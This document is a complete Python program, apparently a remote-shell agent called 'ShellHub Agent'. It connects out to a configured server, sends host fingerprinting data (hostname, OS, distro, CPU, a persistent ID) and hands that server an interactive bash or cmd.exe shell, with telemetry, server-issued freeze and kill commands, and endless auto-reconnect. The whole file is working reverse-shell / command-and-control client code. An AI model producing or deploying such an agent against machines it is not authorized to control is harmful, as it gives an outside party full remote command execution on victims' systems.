#!/usr/bin/env python3
"""
ShellHub Agent — SSH-grade PTY client with auto-reconnect and binary framing.
"""
import socket
import os
import subprocess
import json
import threading
import struct
import signal
import platform
import psutil
import uuid
import time
import sys

# Conditional imports for Unix-only modules
try:
    import pty
    import fcntl
    import termios
    HAS_PTY = True
except ImportError:
    HAS_PTY = False

# ──────────────────────────── Configuration ────────────────────────────
SERVER_IP   = "127.0.0.1"
SERVER_PORT = 7777
READ_BUF    = 65536

# ──────────────────────────── Protocol ─────────────────────────────────
PTYPE_HANDSHAKE = 0
PTYPE_SHELL     = 1
PTYPE_CTRL      = 2
PTYPE_TELEMETRY = 3
HEADER_FMT      = ">BIB"  # type(1) + length(4) + reserved(1) = 6 bytes
HEADER_SIZE     = struct.calcsize(HEADER_FMT)

# ──────────────────────────── Helpers ──────────────────────────────────
def get_hwid() -> str:
    """Persistent unique ID for this host."""
    hwid_file = ".hwid"
    if os.path.exists(hwid_file):
        try:
            with open(hwid_file, "r") as f:
                hwid = f.read().strip()
                if hwid:
                    return hwid
        except Exception:
            pass
    new_id = str(uuid.uuid4())[:8]
    try:
        with open(hwid_file, "w") as f:
            f.write(new_id)
    except Exception:
        pass
    return new_id


def get_sysinfo(hwid: str) -> dict:
    """Collect platform information to send in the handshake."""
    info = {
        "hwid"    : hwid,
        "os"      : platform.system(),          # Linux / Windows / Darwin
        "distro"  : "Unknown",
        "cpu"     : platform.processor() or platform.machine(),
        "hostname": platform.node(),
    }
    # Best-effort distro detection
    if platform.system() == "Linux":
        try:
            # optional: pip install distro
            import importlib
            _d = importlib.import_module("distro")
            info["distro"] = _d.name(pretty=True) or "Linux"  # type: ignore[attr-defined]
        except (ImportError, ModuleNotFoundError):
            try:
                with open("/etc/os-release") as f:
                    for line in f:
                        if line.startswith("PRETTY_NAME="):
                            info["distro"] = line.split("=", 1)[1].strip().strip('"')
                            break
            except Exception:
                info["distro"] = "Linux"
    elif platform.system() == "Windows":
        info["distro"] = platform.version()
    elif platform.system() == "Darwin":
        info["distro"] = f"macOS {platform.mac_ver()[0]}"
    return info


def set_winsize(fd: int, rows: int, cols: int) -> None:
    if not HAS_PTY:
        return
    try:
        winsize = struct.pack("HHHH", rows, cols, 0, 0)
        fcntl.ioctl(fd, termios.TIOCSWINSZ, winsize)
    except Exception:
        pass


def send_frame(sock: socket.socket, ptype: int, data: bytes) -> bool:
    """Send a framed packet. Returns False if the socket is broken."""
    try:
        header = struct.pack(HEADER_FMT, ptype, len(data), 0)
        sock.sendall(header + data)
        return True
    except Exception:
        return False


# ──────────────────────────── Core agent ───────────────────────────────
_stop_event = threading.Event()


def _build_pty_shell() -> tuple:
    """
    Fork a PTY shell. Returns (master_fd, write_func, start_read_func).
    start_read_func(sock, is_frozen) kicks off the reader thread.
    """
    shell = "/bin/bash" if os.path.exists("/bin/bash") else "/bin/sh"
    env = os.environ.copy()
    env.update({
        "TERM" : "xterm-256color",
        "SHELL": shell,
        "LANG" : "en_US.UTF-8",
        "LC_ALL": "en_US.UTF-8",
    })

    pid, master_fd = pty.fork()
    if pid == 0:
        # Child: exec shell
        try:
            os.execvpe(shell, [shell, "-l"], env)
        except Exception:
            os._exit(1)

    # Parent
    set_winsize(master_fd, 24, 80)

    def write_func(data: bytes):
        try:
            os.write(master_fd, data)
        except OSError:
            pass

    def start_read(sock: socket.socket, is_frozen: list):
        def _reader():
            while not _stop_event.is_set():
                try:
                    data = os.read(master_fd, READ_BUF)
                    if not data:
                        break
                    if not is_frozen[0]:
                        if not send_frame(sock, PTYPE_SHELL, data):
                            break
                except OSError:
                    break
        threading.Thread(target=_reader, daemon=True).start()

    return master_fd, write_func, start_read


def _build_pipe_shell() -> tuple:
    """Fallback: subprocess with pipes (Windows / no-PTY)."""
    shell = "cmd.exe" if platform.system() == "Windows" else "/bin/sh"
    proc = subprocess.Popen(
        [shell],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        bufsize=0,
    )

    def write_func(data: bytes):
        try:
            if proc.stdin:
                proc.stdin.write(data)
                proc.stdin.flush()
        except Exception:
            pass

    def start_read(sock: socket.socket, is_frozen: list):
        def _reader():
            while not _stop_event.is_set():
                try:
                    if proc.stdout is None:
                        break
                    data = proc.stdout.read(4096)
                    if not data:
                        break
                    if not is_frozen[0]:
                        if not send_frame(sock, PTYPE_SHELL, data):
                            break
                except Exception:
                    break
        threading.Thread(target=_reader, daemon=True).start()

    return None, write_func, start_read


def run_session(hwid: str, sysinfo: dict) -> None:
    """Single connection session. Raises on disconnect so caller can retry."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10.0)
    s.connect((SERVER_IP, SERVER_PORT))
    s.settimeout(None)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    print("[+] Conectado. Enviando handshake...", flush=True)

    # ── Handshake ──
    send_frame(s, PTYPE_HANDSHAKE, json.dumps(sysinfo).encode("utf-8"))

    # ── Shell ──
    is_frozen = [False]
    if HAS_PTY and platform.system() != "Windows":
        master_fd, write_func, start_read = _build_pty_shell()
    else:
        master_fd, write_func, start_read = _build_pipe_shell()

    start_read(s, is_frozen)
    print("[+] Shell activa. Esperando comandos...", flush=True)

    # ── Telemetry timer ──
    def telemetry_loop():
        while not _stop_event.is_set():
            time.sleep(10)
            if not is_frozen[0]:
                try:
                    metrics = {
                        "cpu_usage": psutil.cpu_percent(interval=None),
                        "ram_usage": psutil.virtual_memory().percent,
                    }
                    send_frame(s, PTYPE_TELEMETRY, json.dumps(metrics).encode())
                except Exception:
                    break

    threading.Thread(target=telemetry_loop, daemon=True).start()

    # ── Receive loop (blocks until disconnect) ──
    buf = b""
    while not _stop_event.is_set():
        chunk = s.recv(READ_BUF)
        if not chunk:
            raise ConnectionResetError("Server closed connection")
        buf += chunk

        while len(buf) >= HEADER_SIZE:
            ptype, length, _ = struct.unpack(HEADER_FMT, buf[:HEADER_SIZE])
            if len(buf) < HEADER_SIZE + length:
                break
            payload = buf[HEADER_SIZE : HEADER_SIZE + length]
            buf = buf[HEADER_SIZE + length :]

            if ptype == PTYPE_SHELL:
                write_func(payload)

            elif ptype == PTYPE_CTRL:
                try:
                    msg = json.loads(payload.decode("utf-8"))
                    mtype = msg.get("type")
                    if mtype == "resize" and master_fd is not None:
                        set_winsize(master_fd, msg.get("rows", 24), msg.get("cols", 80))
                    elif mtype == "freeze":
                        is_frozen[0] = bool(msg.get("state", False))
                    elif mtype == "kill":
                        print("[!] Señal KILL recibida del servidor.", flush=True)
                        raise ConnectionResetError("Killed by server")
                except (json.JSONDecodeError, KeyError):
                    pass


def start_agent() -> None:
    """Main entry point with exponential-backoff reconnect loop."""
    hwid = get_hwid()
    sysinfo = get_sysinfo(hwid)
    print(f"[*] ShellHub Agent | HWID={hwid} | {sysinfo['os']} {sysinfo['distro']}", flush=True)
    print(f"[*] Objetivo: {SERVER_IP}:{SERVER_PORT}", flush=True)

    delay = 1
    MAX_DELAY = 30

    while not _stop_event.is_set():
        try:
            run_session(hwid, sysinfo)
            # Session ended cleanly — reset back-off
            delay = 1
        except (ConnectionRefusedError, TimeoutError, OSError) as e:
            print(f"[!] Conexión fallida: {e}. Reintentando en {delay}s...", flush=True)
        except ConnectionResetError as e:
            print(f"[!] Sesión terminada: {e}. Reintentando en {delay}s...", flush=True)
        except Exception as e:
            print(f"[!] Error inesperado: {e}. Reintentando en {delay}s...", flush=True)

        # Wait with interruption support, then increase delay
        for _ in range(delay):
            if _stop_event.is_set():
                break
            time.sleep(1)
        delay = min(delay * 2, MAX_DELAY)

    print("[*] Agente detenido.", flush=True)


def _handle_signal(signum, frame):
    print(f"\n[!] Señal recibida ({signum}). Cerrando...", flush=True)
    _stop_event.set()
    sys.exit(0)


if __name__ == "__main__":
    signal.signal(signal.SIGTERM, _handle_signal)
    signal.signal(signal.SIGINT, _handle_signal)
    start_agent()
